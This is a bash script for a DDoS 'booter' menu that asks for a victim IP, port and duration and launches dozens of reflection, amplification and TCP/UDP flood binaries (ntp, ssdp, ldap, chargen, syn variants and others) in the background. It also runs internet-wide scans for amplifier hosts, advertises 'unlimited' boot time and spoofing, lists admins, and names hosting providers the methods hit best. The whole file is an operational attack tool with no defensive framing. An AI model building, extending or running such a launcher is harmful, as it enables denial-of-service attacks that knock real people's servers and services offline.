#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
ULG='\e[4;1;32m'
WHITE='\e[1;37m'
NC='\e[0m'
clear
tput civis
who am i >> logs.txt
echo -n -e "${LIGHTCYAN}Booting Up Menu.. \r"
sleep 1.5
echo -n -e "${LIGHTRED}Logging Information [${LIGHTCYAN}##                       ${LIGHTRED}(8%)\r"
sleep 1
echo -n -e "${LIGHTRED}Logging Information [${LIGHTCYAN}########                 ${LIGHTRED}(38%)\r"
sleep 1
echo -n -e "${LIGHTRED}Logging Information [${LIGHTCYAN}##########               ${LIGHTRED}(49%)\r"
sleep 1
echo -n -e "${LIGHTRED}Logging Information [${LIGHTCYAN}################         ${LIGHTRED}(80%)\r"
sleep 1
echo -n -e "${LIGHTRED}Logging Information [${LIGHTCYAN}#######################${LIGHTRED}] (100%) ${LIGHTCYAN}Finished"
sleep 2
echo -ne '\n'
tput cnorm
while true
do
clear
echo -e "      
          ${BLUE} █████${WHITE}╗ ${BLUE}██${WHITE}╗    ${BLUE}██${WHITE}╗${BLUE}███████${WHITE}╗
          ${BLUE}██${WHITE}╔══${BLUE}██${WHITE}╗${BLUE}██${WHITE}║    ${BLUE}██${WHITE}║${BLUE}██${WHITE}╔════╝
          ${BLUE}███████${WHITE}║${BLUE}██${WHITE}║ ${BLUE}█${WHITE}╗ ${BLUE}██${WHITE}║${BLUE}███████${WHITE}╗
          ${BLUE}██${WHITE}╔══${BLUE}██${WHITE}║${BLUE}██${WHITE}║${BLUE}███${WHITE}╗${BLUE}██${WHITE}║╚════${BLUE}██${WHITE}║
          ${BLUE}██${WHITE}║  ${BLUE}██${WHITE}║╚${BLUE}███${WHITE}╔${BLUE}███${WHITE}╔╝${BLUE}███████${WHITE}║
          ${WHITE}╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝
"
echo -e "${WHITE}Devs:${WHITE} [${LIGHTCYAN}@Slav${WHITE}]"
echo -e -n "${WHITE}Users Online:${LIGHTRED} "
users | wc -w
echo -e "${WHITE}Spoofing:${WHITE} [${LIGHTGREEN}Enabled${WHITE}]"
echo -e "${WHITE}Max boot time:${WHITE} [${LIGHTRED}UNLIMITED${WHITE}]"
echo -e "${LIGHTBLUE}/help ${WHITE}to see commands "
echo -e "\n"
echo -e ""
echo -e ""
echo -e ""
echo -e ""
echo -e -n "${WHITE}[${LIGHTRED}root${YELLOW}@${LIGHTCYAN}AWS ${LIGHTRED}~${WHITE}]${LIGHTRED}#${LIGHTCYAN} \c"
read answer
if [[ $answer == /help ]]
then
clear
echo -e ""
echo -e "${YELLOW}                               //Commands//                                "
echo -e ""
echo -e "${LIGHTRED}[!] ${WHITE}Type: /list  SHOWS AVAILABLE METHODS "
echo -e "${LIGHTRED}[!] ${WHITE}Type: /scan to port scan an IP"
echo -e "${LIGHTRED}[!] ${WHITE}Type: /tos to see tos"
echo -e "${LIGHTRED}[!] ${WHITE}Type: /updates to see info about updates"
echo -e "${LIGHTRED}[!] ${WHITE}Type: /admins for administrator list"
echo -e "${LIGHTRED}[!] ${WHITE}Type: /info for administrator information"
read
fi
if [[ $answer == /ldap ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e "${LIGHTRED}$time"
echo -e ""
./ldap $ip $port ldap.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /sentinel ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./sentinel $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /ssdp ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./ssdp $ip $port ssdp.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /mssql ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./mssql $ip $port mssql.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /drdos ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./drdos $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /ntp ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./ntp $ip $port other.txt 1 -1 $time > attacks.txt &
su
fi
if [[ $answer == /ts3 ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./ts3 $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /chargen ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./chargen $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /snmp ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./snmp $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /netbios ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./netbios $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /frag ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./frag $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /vse ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./vse $ip 1 -1 $time
fi
if [[ $answer == /csyn ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./csyn $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /tcpfin ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./tcp-fin $ip 1 -1 $time > attacks.txt &
fi
if [[ $answer == /dns ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./dns $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /zsyn ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./zsyn $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /dominate ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./dominate $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /issyn ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./issyn $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /zap ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./zap $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /tcppsh ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./tcp-psh $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /tcpxmas ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./tcp-xmas $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /tcprst ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./tcp-rst $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /xsyn ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./xsyn $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /tcpse ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./tcp-se $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /telnet ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./telnet $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /udp ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./udp $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /quake ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./quake $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /ttysniff ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./ttysniff $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /mdns ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./mdns $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /natpmp ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./nat-pmp $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /stcp ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./stcp $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /stco ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./stco $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /rand ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./rand $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /rip ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./RIP $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /joom ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./joom $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /heartbeat ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./heartbeat $ip $port 1 -1 $time > attacks.txt &
fi
if [[ $answer == /echo ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./echo $ip $port other.txt 1 -1 $time > attacks.txt &
fi
if [[ $answer == /chargenscan ]]
then
clear
echo -e ""
clear
echo -e ""
./chargenscan 1.0.0.0 255.255.255.255 other.txt 2 1ms 
fi
if [[ $answer == /ldapscan ]]
then
clear
echo -e ""
clear
echo -e ""
./ldapscan 1.0.0.0 255.255.255.255 ldap.txt 2 1ms 
fi
if [[ $answer == /ntpscan ]]
then
clear
echo -e ""
clear
echo -e ""
./ntpscan 1.0.0.0 255.255.255.255 other.txt 2 1ms 
fi
if [[ $answer == /portmapscan ]]
then
clear
echo -e ""
./portmapscan 1.0.0.0 255.255.255.255 portmap.txt 2 1ms 
fi
if [[ $answer == /greensyn ]]
then
clear
echo -e ""
clear
echo -e ""
./greensyn.c
fi
if [[ $answer == /syn9 ]]
then
clear
echo -e ""
clear
echo -e ""
./syn9.c 
fi
if [[ $answer == /ssdpscan ]]
then
clear
echo -e ""
clear
echo -e ""
./ssdpscan 1.0.0.0 255.255.255.255 ssdp.txt 2 1ms 
fi
if [[ $answer == /sentinelscan ]]
then
clear
echo -e ""
clear
echo -e ""
./sentinelscan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /snmpscan ]]
then
clear
echo -e ""
clear
echo -e ""
./snmpscan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /netbiosscan ]]
then
clear
echo -e ""
clear
echo -e ""
./netbiosscan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /mssqlscan ]]
then
clear
echo -e ""
clear
echo -e ""
./mssqlscan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /ts3scan ]]
then
clear
echo -e ""
clear
echo -e ""
./ts3scan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /db2pscan ]]
then
clear
echo -e ""
clear
echo -e ""
./db2scan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /tftpscan ]]
then
clear
echo -e ""
clear
echo -e ""
./tftpscan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /echoscan ]]
then
clear
echo -e ""
clear
echo -e ""
./echoscan 1.0.0.0 255.255.255.255 other.txt 2 1ms
fi
if [[ $answer == /valve ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./valve.c $ip $port 1 $time
fi
if [[ $answer == /nfo ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./nfo.c $ip $port other.txt 1 $time
fi
if [[ $answer == /abuse ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./abuse.c $ip $port 1 -1 $time
fi
if [[ $answer == /greensyn ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./greensyn.c
fi
if [[ $answer == /tool ]]
then
clear
echo -e ""
python tool.py
fi
if [[ $answer == /HR ]]
then
clear
echo -e ""
python HR.py
fi
if [[ $answer == /portscan ]]
then
clear
echo -e ""
python port.py
fi
if [[ $answer == /syn9 ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./syn9.c
fi
if [[ $answer == /synack ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./synack.c
fi
if [[ $answer == /portmap ]]
then
clear
echo -e ""
echo -e "${WHITE} Victim IP: \c"
read ip
clear
echo -e ""
echo -e "${WHITE} Desired port: \c"
read port
clear
echo -e ""
echo -e "${WHITE} Desired Time: \c"
read time
clear
echo -e ""
./portmap $ip $port portmap.txt 1 -1 $time
clear
tput civis
echo -e ""
echo -e "${LIGHTRED} Done!"
sleep 3
tput cnorm
clear
fi
if [[ $answer == /scan ]]
then
clear
echo -e ""
echo -e "${LIGHTRED}[+]${WHITE}IP to scan: \c"
read ip2
clear
echo -e ""
echo -e -n "${LIGHTRED}[+]${WHITE} Port scanning ${LIGHTRED}$ip2"
spinner () {
    local SP_WIDTH="$3"
    local SP_DELAY="$4"
    local SP_STRING=${2:-"'|/=\'"}
    local SP_COLOR=0
    tput civis
    while [ -d /proc/$1 ]; do
        ((RANDOM%2 == 0)) && SP_COLOR=3$((RANDOM%8)) || SP_COLOR=9$((RANDOM%8))
        printf "\e[1;${SP_COLOR}m\e7  %${SP_WIDTH}s  \e8\e[0m" "$SP_STRING"
        sleep ${SP_DELAY:-.2}
        SP_STRING=${SP_STRING#"${SP_STRING%?}"}${SP_STRING%?}
    done
    tput cnorm
}

sleep 2.5 &
spinner "$!" '-\\|/' '1.1' '.2'
tput civis
sleep 1
tput cnorm
clear
nmap $ip2 -r
read input
clear
fi
if [[ $answer == /cunt ]]
then
clear
exit jack.sh
fi
if [[ $answer == /updates ]]
then
clear
echo -e ""
echo -e "${YELLOW}                               //Updates//                            "
echo -e ""
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/4/18: New layout, options, and commands"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/4/18: Added chargen method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/4/18: added ntp method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/4/18: Added ssdp method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/7/18: Added ldap method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/7/18: Added vse method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/7/18: Added New Layout"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/7/18: Added New Lists"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/9/18: Added echo method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added greensyn method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added yubina method"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added Custom commands"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: New Admin: @Revelations"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: New Admin: @AWSColt"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added 21 New Methods"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added Charlie List"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added Foxtrot List"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added Upgraded Amplifications"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: Added 12 New Methods"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/12/18: New Admin: @Varitysec"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/14/18: Added New Methods"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/14/18: New Banner"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/14/18: New Options/commands"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/14/18: Private Release 1.4"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/14/18: New Updates Coming soon.."
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/14/18: New Hard Hitting methods"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/19.18: Fixed Portmap Scanning alongside portmap itself"
echo -e "${LIGHTRED}[!] ${WHITE}Update 1/19.18: Added >list explained< option"
read
fi
if [[ $answer == /list ]]
then
clear
echo -e ""
echo -e "${YELLOW}                               //Lists//                            "
echo -e ""
echo -e "${LIGHTRED}[!] ${WHITE}/valve    ${LIGHTRED}[!] ${WHITE}/greensyn  "
echo -e "${LIGHTRED}[!] ${WHITE}/syn9     ${LIGHTRED}[!] ${WHITE}/synack  "
echo -e "${LIGHTRED}[!] ${WHITE}/vse      ${LIGHTRED}[!] ${WHITE}/echo  "
echo -e "${LIGHTRED}[!] ${WHITE}/chargen  ${LIGHTRED}[!] ${WHITE}/heartbeat   "
echo -e "${LIGHTRED}[!] ${WHITE}/portmap  ${LIGHTRED}[!] ${WHITE}/mdns  "
echo -e "${LIGHTRED}[!] ${WHITE}/ldap     ${LIGHTRED}[!] ${WHITE}/joom  "
echo -e "${LIGHTRED}[!] ${WHITE}/ssdp     ${LIGHTRED}[!] ${WHITE}/rand  "
echo -e "${LIGHTRED}[!] ${WHITE}/sentinel ${LIGHTRED}[!] ${WHITE}/RIP   "
echo -e "${LIGHTRED}[!] ${WHITE}/drdos    ${LIGHTRED}[!] ${WHITE}/stco  "
echo -e "${LIGHTRED}[!] ${WHITE}/ntp      ${LIGHTRED}[!] ${WHITE}/stcp  "
echo -e "${LIGHTRED}[!] ${WHITE}/ts3      ${LIGHTRED}[!] ${WHITE}/tftp  "
echo -e "${LIGHTRED}[!] ${WHITE}/snmp     ${LIGHTRED}[!] ${WHITE}/udp  "
echo -e "${LIGHTRED}[!] ${WHITE}/netbios  ${LIGHTRED}[!] ${WHITE}/quake "
echo -e "${LIGHTRED}[!] ${WHITE}/frag     ${LIGHTRED}[!] ${WHITE}/nfo"
echo -e "${LIGHTRED}[!] ${WHITE}/tcp-rst  ${LIGHTRED}[!] ${WHITE}/abuse        "
echo -e "${LIGHTRED}[!] ${WHITE}/tcp-fin  ${LIGHTRED}[!] ${WHITE}/mssqlscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/tcp-psh  ${LIGHTRED}[!] ${WHITE}/netbiosscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/tcp-se   ${LIGHTRED}[!] ${WHITE}/snmpscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/tcp-xmas ${LIGHTRED}[!] ${WHITE}/chargenscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/telnet   ${LIGHTRED}[!] ${WHITE}/dnsscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/dominate ${LIGHTRED}[!] ${WHITE}/dnsscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/zap      ${LIGHTRED}[!] ${WHITE}/tftpscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/zsyn     ${LIGHTRED}[!] ${WHITE}/ntpscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/csyn     ${LIGHTRED}[!] ${WHITE}/ts3scan        "
echo -e "${LIGHTRED}[!] ${WHITE}/xsyn     ${LIGHTRED}[!] ${WHITE}/echoscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/db2      ${LIGHTRED}[!] ${WHITE}/ssdpscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/essyn    ${LIGHTRED}[!] ${WHITE}/ldapscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/tcp      ${LIGHTRED}[!] ${WHITE}/portmapscan        "
echo -e "${LIGHTRED}[!] ${WHITE}/wizard   ${LIGHTRED}[!] ${WHITE}/db2scan       "
echo -e "${LIGHTRED}[!] ${WHITE}/xmlrpc   ${LIGHTRED}[!] ${WHITE}/mssqlscan        "
read
fi
if [[ $answer == /tos ]]
then
clear
echo -e ""
echo -e "${YELLOW}                             //Terms Of Service//                            "
echo -e ""
echo -e "${LIGHTRED}1. ${WHITE}Do not share login info or server credentials"
echo -e "${LIGHTRED}2. ${WHITE}Do not disrespect administrators or devs"
echo -e "${LIGHTRED}3. ${WHITE}Do not spam server"
echo -e "${LIGHTRED}4. ${WHITE}Do not exceed max boot time unless given permission"
read
fi
if [[ $answer == /admins ]]
then
clear
echo -e ""
echo -e "${YELLOW}                             //Admin/VIP List//                            "
echo -e ""
echo -e "${LIGHTRED}1. ${LIGHTCYAN} Revelations "
echo -e "${LIGHTRED}2. ${LIGHTCYAN} AWSColt "
echo -e "${LIGHTRED}3. ${LIGHTCYAN} Varity / Varitysec "
echo -e "${LIGHTRED}3. ${LIGHTCYAN} Sage / oAntiMrWifi "
read
fi
if [[ $answer == /info ]]
then
clear
echo -e ""
echo -e "${YELLOW}                             //Administrator Information//                            "
echo -e ""
echo -e "${LIGHTRED}1. ${LIGHTCYAN} J4CK | instagram @Flexingonlamers | Skype @live:flexingonlamers "
read
fi
if [[ $answer == /listinfo ]]
then
clear
echo -e ""
echo -e "${YELLOW}                             //amplists best servers//                            "
echo -e ""
echo -e "${LIGHTRED}1. ${LIGHTCYAN} syn9  WORKS BEST FOR GODADDY, CHOOPA, DIGITALOCEAN, NFOS, OVHS, ZARE "
echo -e "${LIGHTRED}1. ${LIGHTCYAN} greensyn WORKS BEST CHOOPA, GODADDY , ZARE "
echo -e "${LIGHTRED}2. ${LIGHTCYAN} MORE SOON"
echo -e "${LIGHTRED}3. ${LIGHTCYAN} MORE SOON"
echo -e "${LIGHTRED}3. ${LIGHTCYAN} MORE SOON"
read
fi
done
